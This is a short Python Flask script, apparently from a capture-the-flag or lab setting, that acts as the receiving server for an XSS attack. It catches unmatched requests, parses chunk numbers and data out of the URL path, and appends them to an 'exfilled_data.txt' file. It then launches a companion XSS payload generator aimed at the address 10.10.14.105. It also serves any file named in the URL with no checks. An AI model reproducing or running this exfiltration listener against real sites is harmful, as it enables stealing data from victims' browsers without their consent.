import flask
from flask import Flask, render_template
import click
import urllib.parse
import json
from flask import request
from pathlib import Path
import uuid
import xss
import threading

app = Flask(__name__)


@app.errorhandler(404)
def default_route(e):
    path = request.path.split("/")[2:]
    chunk_number = path[0]
    chunk_data = Path(path[1]).with_suffix('')
    print(f"received chunk {chunk_number}")
    with open("exfilled_data.txt", "a+") as exfil_file_object:
        exfil_file_object.write(f"{chunk_number} {chunk_data}\n")
    return "bruh"


@app.route("/<string:filename>")
def return_file(filename):
    return flask.send_file(filename)


@click.command()
@click.argument("host", type=str, default="0.0.0.0")
@click.argument("port", type=int, default=8989)
def main(host: str, port: int):
    """Opens a server that saves requests (use with xss.py)"""
    threading.Thread(target=app.run, kwargs={"host": host, "port": port}).start()
    xss.create_xss(("10.10.14.105", port))


if __name__ == '__main__':
    main()
